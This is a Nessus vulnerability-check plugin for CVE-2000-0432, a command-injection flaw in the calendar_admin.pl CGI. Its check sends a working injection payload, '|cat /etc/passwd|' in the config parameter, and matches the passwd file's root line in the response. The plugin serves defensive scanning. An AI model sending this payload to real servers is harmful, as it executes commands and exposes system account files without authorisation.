#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10506);
 script_bugtraq_id(1215);
 script_osvdb_id(405);
 script_version ("$Revision: 1.29 $");
 script_cve_id("CVE-2000-0432");
 script_name(english:"Matt Kruse calendar_admin.pl Shell Metacharacter Arbitrary Command Execution");
 script_summary(english:"Checks for the presence of /cgi-bin/calendar_admin.pl");
 
 script_set_attribute(
   attribute:"synopsis",
   value:"The remote web application has a command execution vulnerability."
 );
 script_set_attribute(attribute:"description", value:
"The 'calendar_admin.pl' CGI is installed. This CGI has a well known
security flaw that allows a remote attacker to execute commands with
the privileges of the web server." );
 script_set_attribute( attribute:"solution", value:
"There is no known solution at this time.  Disable this application by
removing it from /cgi-bin." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:W/RC:ND");
 script_set_attribute(attribute:"plugin_publication_date", value: "2000/09/10");
 script_set_attribute(attribute:"vuln_publication_date", value: "2000/05/16");
 script_cvs_date("$Date: 2011/03/14 21:48:02 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();
 
 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses");
 
 script_copyright(english:"This script is Copyright (C) 2000-2011 Tenable Network Security, Inc.");
 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);

function go(dir, cgi, port)
{
 local_var item, r, req;
 item = string(dir, "/", cgi, "?config=|cat%20/etc/passwd|");
 r = http_send_recv3(method:"GET", item:item, port:port);
 if( r == NULL)exit(0);
 if(egrep(pattern:"root:.*:0:[01]:", string:r))
  {
   security_hole(port);
   exit(0);
  }
}

foreach dir (cgi_dirs())
{
 go(dir:dir, cgi:"calendar_admin.pl", port:port);
# go(dir:dir, cgi:"calendar/calendar_admin.pl", port:port);
# go(dir:dir, cgi:"calendar/calender.pl", port:port);
}
